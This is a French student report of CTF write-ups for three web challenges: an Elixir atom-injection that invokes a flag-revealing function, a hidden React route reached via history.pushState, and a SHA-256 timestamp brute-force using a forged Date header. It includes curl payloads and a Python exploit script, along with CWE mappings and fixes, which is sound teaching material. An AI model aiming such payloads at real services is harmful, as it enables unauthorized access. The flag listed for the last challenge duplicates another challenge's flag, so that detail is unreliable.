# TP Special INF600C

**Auteurs**: <br>
Étienne Latendresse-Tremblay (LATE16039706) <br>
Juan Carlos Mérida Cortés (MERJ69080104)

# ***AtomBomb***

### Description de l’épreuve

Le challenge "AtomBomb" est une épreuve de type web/service où l’on interagit avec un serveur écrit en Elixir. Le point de départ pour l'exploit était un service HTTP qui acceptait un JSON en POST sur une route ``/bomb_impacts``, censé contenir des informations sur une bombe (altitude, type d’explosion, puissance, etc.). Le but était de déclencher une exécution inattendue ou une erreur du serveur afin de récupérer un flag.

Contrairement aux services REST classiques, ce backend repose sur Elixir (et Phoenix), un framework fonctionnel. Le nom de l’épreuve et certains comportements du serveur suggéraient une vulnérabilité liée aux atoms, une structure de données particulière à Elixir.

## Analyse des artefacts et identification des indices

Le serveur s'attendait à recevoir un objet JSON avec une clé ``impact`` contenant les détails d’une bombe. Par exemple :
```json
{
  "impact": {
    "bomb": {
      "location": "florida",
      "altitude": "low_altitude",
      "power": 363,
      "explosion_type": 4
    }
  }
}
```

Une tentative de fuzzing a révélé que certaines erreurs côté serveur faisaient référence à des atoms inconnus, ce qui nous a amené à se concentrer sur le ``:`` dans Elixir, la fonction ``String.to_existing_atom/1`` ne crée pas de nouvel atom mais échoue si l’atom n’existe pas déjà. Cela ouvre la voie à un crash contrôlé ou même à une exécution de code si d'autres modules sont appelés dynamiquement.

Le code source du backend a confirmé cette intuition. Dans le controller :

```elixir
defmodule AtomBomb.PageController do
# (...)
  def get_bomb_impacts(conn, params) do
    params = AtomBomb.atomizer(params)
    danger_message = AtomBomb.calculate_bomb_danger_level(params.impact.bomb)
    render(conn, :danger_level, danger_message: danger_message)
  end
end
```

La ligne vulnérable est :
``params = AtomBomb.atomizer(params)``

Elle appelle la fonction ``atomizer/1`` définie dans le module AtomBomb, dont voici le passage critique :

```elixir
def atomizer(params) when is_binary(params) do
  if String.at(params, 0) == ":" do
    atom_string = String.slice(params, 1..-1//1)
    case string_to_atom(atom_string) do
      {:ok, val} -> val
      :error -> nil
    end
  else
    params
  end
end
```
<br><br><br>
Cette fonction convertit toute chaîne commençant par ``:`` en un atom Elixir existant. Si ce champ correspond à un nom de module valide (par exemple ``":Elixir.AtomBomb"``), il devient littéralement l’atom ``Elixir.AtomBomb``.
<br>
Ensuite, dans une autre partie du code, si ce champ est utilisé dans un ``apply/3`` (par exemple ``apply(mod, :bomb, [])``), cela permet d'exécuter n’importe quelle fonction ``bomb/0`` d’un module existant. Le module ``AtomBomb`` inclut justement une telle fonction :

```elixir
def bomb() do
  flag = case File.read("flag.txt") do
    {:ok, flag} -> flag
    {:error, _} -> "bctf{REDACTED}"
  end
  "The atom bomb detonated, and left in the crater there is a chunk of metal inscribed with #{flag}"
end
```

Alors, un test avec un payload du type :
```json
{
  "impact": ":Elixir.AtomBomb"
}
```
Et donc on obtiendrait:
`` danger_message = AtomBomb.calculate_bomb_danger_level(Elixir.AtomBomb.bomb)``

ce qui nous donne le flag.

## Recherches effectuées

### Documentation officielle : <br> https://hexdocs.pm/elixir/String.html#to_existing_atom/1

### Résumé utile :

* ``String.to_existing_atom("foo")`` échoue si ``:foo`` n'existe pas.

* Les atoms ne sont pas garbage-collected et peuvent faire planter l'application si on en crée trop (atom leak).

* Certaines fonctions essaient de convertir dynamiquement des chaînes en atoms pour appeler des modules/fonctions, c’est là qu’on peut injecter quelque chose de spécial.

## Tentatives et actions mises en œuvre

1. Envoi de payloads valides (structure correcte, sans injection) → réponses standards.

2. Envoi de chaînes invalides dans les clés ou valeurs → erreurs mais sans flag.

3. Hypothèse sur l’usage de to_existing_atom → tests avec valeurs "piégées".

4. Injection de ":Elixir.AtomBomb" dans le champ impact → déclenchement du flag.

## CWE associées

* **CWE-138: Improper Neutralization of Special Elements** — Usage dangereux de fonctions de conversion type eval, to_atom, etc.

* **CWE-502: Deserialization of Untrusted Data** — Même si ce n'est pas de la désérialisation au sens strict, il s’agit d’un traitement non-sécurisé de données entrantes.

## Flag obtenu

``bctf{n0w_w3_ar3_a1l_d3ad_:(_8cd12c17102ac269}``

Ce flag souligne bien mon état après l'avoir eu lol.

## Code des exploits et payloads

```sh
curl -X POST http://localhost:6888/bomb_impacts \
  -H "Content-Type: application/json" \
  --data '{"impact": ":Elixir.AtomBomb"}'
```
```sh
curl -X POST https://atom-bomb.atreides.b01lersc.tf/bomb_impacts \
  -H "Content-Type: application/json" \
  --data '{"impact": ":Elixir.AtomBomb"}'
```

Ce simple payload suffit à déclencher la réponse contenant le flag si le backend tente de convertir ce champ en atom et l’évalue ensuite.

## Propositions de correction

* Supprimer toute conversion dynamique non contrôlée de chaînes en atoms.

* Remplacer apply/3 par des appels directs à des fonctions explicites et sûres.

* Isoler et filtrer les paramètres utilisateur dès l’entrée (pattern matching strict).

* Si des atoms doivent être générés, valider contre une liste blanche ou utiliser une table de correspondance sécurisée.


# TroubleAtTheSpa

## Description de l’épreuve

Le challenge "TroubleAtTheSpa" est une épreuve de web orientée autour d’une Single Page Application (SPA) développée avec React et empaquetée via Vite. Le site simule une belle page de présentation d'un site de blockchain, mais le véritable objectif est de trouver un flag caché quelque part dans l’application. Aucune route ou lien visible ne semble y mener directement, et le flag n’apparaît pas sur l’interface utilisateur. L’approche classique de recherche dans le DOM ou d’analyse de requêtes réseau n’aboutit pas. L’intuition doit donc porter sur la structure interne d’une SPA et la possibilité d’une navigation non conventionnelle. Il faut souligner qu'on nous fournit le code source de l'application dans un ``.zip`` pour tester localement.

## Analyse des artefacts et identification des indices

L’analyse du code source révèle une ``Single Page Application (SPA)`` réalisée avec React et Vite. En inspectant la structure des fichiers, on identifie un composant ``Flag.tsx`` qui contient directement le flag dans son JSX, bien qu’il ne soit pas affiché par défaut dans l’interface.

```bash 
src (liste de pages pouvant être affichés par le site)
├── AdCard.tsx
├── App.tsx
├── Flag.tsx
├── Footer.tsx
├── Header.tsx
├── index.css
├── main.tsx
└── vite-env.d.ts
```

Le comportement de routage est géré côté client, sans rechargement de page, via l’API ``history.pushState``. Cela signifie que certaines routes peuvent être accessibles uniquement par manipulation manuelle de l’historique.

Indice principal : un composant React ``Flag.tsx`` affiche directement :
``{'bctf{fake_flag}'}``
qui serait l'emplacement du vrai flag distant.

Mais il faut simuler la navigation vers ``/flag`` pour le voir s’afficher dans l’interface.

## Recherches bibliographiques et documentaires

* [React Router Documentation](https://reactrouter.com/) : pour comprendre la gestion des routes dans une SPA.

* [MDN Web Docs – pushState](https://developer.mozilla.org/en-US/docs/Web/API/History/pushState) : pour manipuler le routage côté client.

## Résumé :

* Les composants dans une SPA peuvent être présents dans le bundle sans être exposés dans le DOM.

* Il est possible d'afficher manuellement un composant via manipulation du history.

## Tentatives et actions mises en œuvre

1. Analyse du DOM avec les DevTools → aucun flag visible.

2. Recherche dans les sources du bundle avec des mots-clés (bctf, flag) → présence de Flag.tsx.

3. Essayer d'aller directement vers /flag → résulte dans une erreur 404 affichée par Github Pages.

4. Test manuel en console :

```javascript
window.history.pushState({}, "", "/flag");
window.dispatchEvent(new PopStateEvent("popstate"));
```
Le flag s’affiche, confirmant que la route est bien reliée au composant.

## CWE associées

* CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

* CWE-922: Insecure Storage of Sensitive Information

Ces CWE s’appliquent car le flag est exposé en dur dans le frontend, sans mécanisme d’authentification ou de contrôle d’accès.

## Flag obtenu

``bctf{r3wr1t1ng_h1st0ry_1b07a3768fc}``

## Proposition de correction

Vu que les SAP opèrent principalement Client-Side et juste côté Front-End de facon dynamique, il est presque impossible de bien protéger des données sensibles si quelqu'un a accès au code source de l'application. L'implémentation d'une authentification par le back-end pourrait être la solution mais cela va contre l'objectif d'un SAP qui est de charger le contenu dynamiquement sans avoir à faire appel à un back-end, ce qui le rend plus rapide; donc parmis les propositions on peut dire que pour prévénir:

* Ne jamais inclure de données sensibles dans le frontend.
* Éviter d’utiliser des routes accessibles sans protection dans des SPAs pour des contenus sensibles.

### (Contre les objectifs d'un SAP): 

* Servir le flag depuis un backend avec authentification, via une API sécurisée (par exemple GET /api/flag qui vérifie une session ou un token). 

* Restreindre l’accès au composant Flag selon des conditions d’autorisation explicites côté backend.

## Bonus
On pouvait aussi essayer de reverse/deobfusquer le code source dans le fichier ``index-<hash>.js`` et avoir le flag mais ce n'était pas le but du challenge.



# When

## Description de l’épreuve

Le challenge "When" est une épreuve de type web/reversing. Le service cible était accessible à l’URL https://when.atreides.b01lersc.tf/gamble et attendait une requête HTTP avec un en-tête Date. L’objectif était d’envoyer une requête à un moment très spécifique, ou simulé comme tel, pour déclencher une réponse contenant le flag.

Un fichier ZIP contenant le code source complet du backend était fourni. L'analyse de ce code ``src/app/app.ts`` permet de comprendre que le serveur utilise le timestamp contenu dans l'en-tête Date comme point de départ d'un calcul SHA-256. Si les deux premiers octets du hash sont égaux à 0xff, le flag est renvoyé.

## Analyse des artefacts et identification des indices

Extrait du code serveur dans ``app.ts`` :
```ts
const time = req.headers.date ? new Date(req.headers.date) : new Date();
const number = Math.floor(time.getTime() / 1000);

gamble(number).then(data => {
    const bytes = new Uint8Array(data);
    if (bytes[0] == 255 && bytes[1] == 255) {
        res.send({ success: true, flag: process.env.FLAG });
    } else {
        res.send({ success: false });
    }
});
```

La fonction gamble() calcule simplement le hash SHA-256 de ce timestamp (en secondes). L’absence de sel (salt) ou de clé secrète rend l’entrée entièrement prédictible et donc vulnérable à une brute-force.

## Tentatives et actions mises en œuvre

1. Envoi de requêtes avec l’heure actuelle → réponse neutre.

2. Tentatives avec timestamps au hasard → rien.

3. Analyse du script fourni (solve.py) → découverte de la contrainte sur le SHA-256.

4. Analyse du backend → confirmation que Date est utilisé directement.

5. Brute-force via solve.py → découverte d’un timestamp chanceux.

6. Requête POST avec en-tête Date: personnalisé → obtention du flag.

## CWE associées

* **CWE-330: Use of Insufficiently Random Values** — le serveur utilise un timestamp sans secret comme source sensible.

* **CWE-331: Insufficient Entropy** — une brute-force sur 7200 secondes suffit à reproduire un hash valide.

## Flag obtenu
``bctf{r3wr1t1ng_h1st0ry_1b07a3768fc}``  (Sat, 19 Apr 2025 00:16:37 GMT)

D'autres moment étaient possibles selon l'auteur mais je l'ai eu 20 mins avant le moment indiqué.

## Code d’exploit

```python
import hashlib
import requests
import time
from datetime import datetime

url = "https://when.atreides.b01lersc.tf/gamble"
start_time = int(time.time()) - 3600
end_time = int(time.time()) + 3600

def find_lucky_timestamp(start, end):
    for ts in range(start, end):
        h = hashlib.sha256(str(ts).encode()).digest()
        if h[0] == 0xff and h[1] == 0xff:
            return ts
    return None

ts = find_lucky_timestamp(start_time, end_time)

if ts:
    http_date = datetime.utcfromtimestamp(ts).strftime('%a, %d %b %Y %H:%M:%S GMT')
    headers = {"Date": http_date}
    res = requests.post(url, headers=headers)
    print(res.json())
```

## Proposition de correction

* Ajouter un ``secret`` côté serveur non transmis côté client pour rendre l'entrée non brute-forcable mais aussi non prédictible sans connaitre le ``secret``.

* Éviter de conditionner un comportement critique à une valeur entièrement contrôlable/predictible.

* Limiter drastiquement le nombre de tentatives (déjà partiellement implémenté via rate-limiting).


